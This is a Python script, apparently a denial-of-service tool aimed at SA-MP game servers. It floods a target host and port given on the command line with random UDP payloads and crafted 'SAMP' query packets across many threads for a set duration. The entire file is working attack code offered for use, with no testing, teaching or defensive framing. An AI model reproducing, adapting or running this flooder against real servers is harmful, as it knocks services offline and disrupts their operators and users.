#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import os, socket, struct, codecs, sys, threading, random, time

host = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])

waktu_skrg = int(time.time()) + int(times)

Randomlex = [
 b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
 b'SAMP\x958\xe1\xa9a\x1ec',
 b'SAMP\x958\xe1\xa9a\x1ei',
 b'SAMP\x958\xe1\xa9a\x1er',
 b'SAMP\x958\xe1\xa9a\x1ev',
 b'SAMP\x958\xe1\xa9a\x1eg',
 b'\x08\x1eb\xda',
 b'\x08\x1eb\xda',
 b'\x02\x1e\xfdS',
 b'\x08\x1eM\xda',
 b'\x02\x1e\xfd@',
 b'\x08\x1e~\xda'
 ]

def send_attack():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1081)
	pack = random._urandom(999)
	msg = Randomlex[random.randrange(0, 1)]
	while int(time.time()) < waktu_skrg:
		s.sendto(bytes, (host, int(port)))
		s.sendto(pack, (host, int(port)))
		s.sendto(msg, (host, int(port)))
		s.sendto(Randomlex[0], (host, int(port)))
		s.sendto(Randomlex[0], (host, int(port)))
		s.sendto(Randomlex[1], (host, int(port)))
		s.sendto(Randomlex[2], (host, int(port)))
		s.sendto(Randomlex[3], (host, int(port)))
		s.sendto(Randomlex[4], (host, int(port)))
		s.sendto(Randomlex[5], (host, int(port)))
		s.sendto(Randomlex[6], (host, int(port)))
		s.sendto(Randomlex[7], (host, int(port)))
		s.sendto(Randomlex[8], (host, int(port)))
		s.sendto(Randomlex[9], (host, int(port)))
		s.sendto(Randomlex[10], (host, int(port)))
		s.sendto(Randomlex[11], (host, int(port)))

def send_attacks():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1081)
	pack = random._urandom(999)
	while int(time.time()) < waktu_skrg:
		s.sendto(bytes, (host, int(port)))
		s.sendto(pack, (host, int(port)))
		s.sendto(Randomlex[0], (host, int(port)))
		s.sendto(Randomlex[0], (host, int(port)))
		s.sendto(Randomlex[1], (host, int(port)))
		s.sendto(Randomlex[2], (host, int(port)))
		s.sendto(Randomlex[3], (host, int(port)))
		s.sendto(Randomlex[4], (host, int(port)))
		s.sendto(Randomlex[5], (host, int(port)))
		s.sendto(Randomlex[6], (host, int(port)))
		s.sendto(Randomlex[7], (host, int(port)))
		s.sendto(Randomlex[8], (host, int(port)))
		s.sendto(Randomlex[9], (host, int(port)))
		s.sendto(Randomlex[10], (host, int(port)))
		s.sendto(Randomlex[11], (host, int(port)))


for _ in range(threads):
	threading.Thread(target = send_attack).start()
	threading.Thread(target = send_attacks).start()